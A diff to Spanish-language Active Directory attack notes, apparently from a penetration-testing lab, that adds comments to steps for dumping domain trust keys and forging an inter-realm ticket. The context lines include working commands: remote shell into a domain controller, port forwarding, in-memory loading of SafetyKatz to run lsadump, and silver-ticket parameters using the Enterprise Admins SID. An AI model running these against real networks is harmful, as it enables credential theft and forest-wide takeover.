@@ -36,6 +36,8 @@ Paso 2:
 Paso 3:
 ❯ winrs -r:dcorp-dc cmd       # Ingresar al DC 
 ❯ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
+
+# PAso 3 IMPORTANTE 
 ❯ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
 # Descarga SafetyKatz en memoria dentro del DC y ejecuta lsadump::trust para extraer las Trust Keys almacenadas en el controlador de dominio.
 
@@ -81,8 +83,8 @@ Paso 4 (Abusar de la forma 1):
 	# silver    → Nombre del módulo 
 	# /service  → servicio objetivo: krbtgt del dominio padre (inter-realm TGT)
 	# /rc4      → trust key (hash NTLM) de la relación de confianza hijo → padre  (IMPORTANTE)
-	# /sid      → SID del dominio hijo
-	# /sids     → SID del grupo Enterprise Admins del dominio padre (S-1-5-21-...-519) — otorga privilegios en todo el bosque
+	# /sid      → SID del dominio hijo. Es el (Current domain:)
+	# /sids     → SID del grupo Enterprise Admins del dominio padre (S-1-5-21-...-519) — otorga privilegios en todo el bosque. Es el (Domain:)
 	# 519       → El 519 al final del sid es importante para que funcione 
 	# /ldap     → consulta al DC para obtener atributos del usuario automáticamente
 	# /user     → usuario Administrator a impersonar en el ticket forjado
